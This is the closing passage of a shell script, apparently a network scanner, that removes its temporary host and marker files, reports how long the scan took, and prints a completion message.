# --------- Cleanup ----------
rm -f "$HINT_FILE" "$HOSTS_FILE" "$DISCOVERED_HOSTS" "$REDIRECT_HOSTS" "$KERB_MARKER" "$HTTP_MARKER" "$HTTPS_MARKER"

END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))
echo
success "Scan completed in ${DURATION}s"
echo
echo "Scan complete."
